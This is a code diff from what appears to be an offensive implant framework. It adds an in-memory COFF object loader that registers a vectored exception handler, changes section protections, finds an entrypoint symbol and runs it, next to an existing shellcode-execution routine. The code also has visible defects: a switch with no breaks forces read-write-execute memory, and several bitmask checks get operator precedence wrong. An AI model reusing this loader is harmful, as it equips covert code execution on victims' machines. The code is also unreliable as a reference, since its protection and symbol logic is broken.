@@ -134,6 +134,8 @@ namespace Memory {
             }
 
             if (
+                !(F_PTR_HMOD(Ctx->Nt.RtlAddVectoredExceptionHandler, Ctx->Modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER)) ||
+                !(F_PTR_HMOD(Ctx->Nt.RtlRemoveVectoredExceptionHandler, Ctx->Modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER)) ||
                 !(F_PTR_HMOD(Ctx->Nt.NtAllocateVirtualMemory, Ctx->Modules.ntdll, NTALLOCATEVIRTUALMEMORY)) ||
                 !(F_PTR_HMOD(Ctx->Nt.RtlAllocateHeap, Ctx->Modules.ntdll, RTLALLOCATEHEAP)) ||
                 !(F_PTR_HMOD(Ctx->Nt.NtFreeVirtualMemory, Ctx->Modules.ntdll, NTFREEVIRTUALMEMORY)) ||
@@ -462,10 +464,10 @@ namespace Memory {
                     } else {
                         symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols);
                     }
-
                     if (Utils::GetHashFromStringA(symbol_name, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                         n_funcs++;
                     }
+
                     object->reloc = object->reloc + sizeof(_reloc);
                 }
             }
@@ -689,7 +691,7 @@ namespace Memory {
             defer:
         }
 
-        VOID ExecuteShellcode(_parser &parser) {
+        VOID ExecuteShellcode(const _parser &parser) {
             HEXANE
 
             void *address  = { };
@@ -716,15 +718,101 @@ namespace Memory {
                 }
             }
 
-        BOOL ExecuteObject(_executable *object, const char *const entrypoint, const void *args, uint32_t size_t, uint32_t req_id) {
-
-            return true;
-        }
-
-        VOID LoadObject(const char *const entry, uint8_t* const data, void* const args, size_t arg_size, uint32_t req_id) {
+        BOOL ExecuteObject(_executable *object, const char *entrypoint, char *args, uint32_t size, uint32_t req_id) {
             HEXANE
 
-            _executable *object = Memory::Methods::CreateImageData(B_PTR(data));
+            bool success = false;
+            void *veh_handler = { };
+            char *symbol_name = { };
+            void *exec = { };
+
+            if (!(veh_handler = Ctx->Nt.RtlAddVectoredExceptionHandler(1, &Veh::Debugger))) {
+                return_defer(ERROR_INVALID_EXCEPTION_HANDLER);
+            }
+
+            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
+                object->section =  P_IMAGE_SECTION_HEADER(object->buffer, i);
+
+                if (object->section->SizeOfRawData > 0) {
+                    uint32_t protection = 0;
+
+                    switch (object->section->Characteristics & IMAGE_SCN_MEM_RWX) {
+                    case NULL:
+                        protection = PAGE_NOACCESS;
+                    case IMAGE_SCN_MEM_READ:
+                        protection = PAGE_READONLY;
+                    case IMAGE_SCN_MEM_RX:
+                        protection = PAGE_EXECUTE_READ;
+                    case IMAGE_SCN_MEM_RW:
+                        protection = PAGE_READWRITE;
+                    case IMAGE_SCN_MEM_WRITE:
+                        protection = PAGE_WRITECOPY;
+                    case IMAGE_SCN_MEM_XCOPY:
+                        protection = PAGE_EXECUTE_WRITECOPY;
+                    default:
+                        protection = PAGE_EXECUTE_READWRITE;
+                    }
+
+                    if (object->section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED == IMAGE_SCN_MEM_NOT_CACHED) {
+                        protection |= PAGE_NOCACHE;
+                    }
+
+                    if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->sec_map[i].data), &object->sec_map[i].size, protection, nullptr))) {
+                        return_defer(ntstatus);
+                    }
+                }
+            }
+
+            if (object->fn_map->size) {
+                if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->fn_map), &object->fn_map->size, PAGE_READONLY, nullptr))) {
+                    return_defer(ntstatus);
+                }
+            }
+
+            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSymbols; i++) {
+                if (object->symbol[i].First.Value[0] != 0) {
+                    symbol_name = object->symbol[i].First.Name;
+                } else {
+                    symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols + object->symbol[i].First.Value[1]);
+                }
+#if _M_IX86
+                if (symbol_name[0] == 0x5F) {
+                    symbol_name++;
+                }
+#endif
+                if (x_memcmp(symbol_name, entrypoint, x_strlen(entrypoint)) == 0) {
+                    if (!(exec = object->sec_map[object->symbol[i].SectionNumber - 1].data + object->symbol[i].Value)) {
+                        return_defer(ERROR_PROC_NOT_FOUND);
+                    }
+                }
+            }
+
+            for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
+                if (U_PTR(exec) >= U_PTR(object->sec_map[i].data) && U_PTR(exec) < U_PTR(object->sec_map[i].data) + object->sec_map[i].size) {
+
+                    object->section = P_IMAGE_SECTION_HEADER(object->buffer, i);
+                    if (object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE == IMAGE_SCN_MEM_EXECUTE) {
+                        success = true;
+                    }
+
+                    break;
+                }
+            }
+
+            if (success) {
+                const auto entry = R_CAST(obj_entry, exec);
+                const auto ret = __builtin_extract_return_addr(__builtin_return_address(0)); // meant for the veh handler
+                entry(args, size);
+            }
+
+            defer:
+            return success;
+        }
+
+        VOID LoadObject(const char *const entrypoint, uint8_t* const data, void* const args, size_t arg_size, uint32_t req_id) {
+            HEXANE
+
+            _executable *object = Methods::CreateImageData(B_PTR(data));
 
             object->next    = Ctx->Coffs;
             Ctx->Coffs      = object;
@@ -733,15 +821,15 @@ namespace Memory {
                 return_defer(ntstatus);
             }
 
-            if (!Memory::Objects::MapSections(object, data)) {
+            if (!Objects::MapSections(object, data)) {
                 return_defer(ntstatus);
             }
 
-            if (!Memory::Objects::BaseRelocation(object)) {
+            if (!Objects::BaseRelocation(object)) {
                 return_defer(ntstatus);
             }
 
-            if (!Memory::Execute::ExecuteObject(object, entry, args, arg_size, req_id)) {
+            if (!ExecuteObject(object, entrypoint, args, arg_size, req_id)) {
                 return_defer(ntstatus);
             }
 
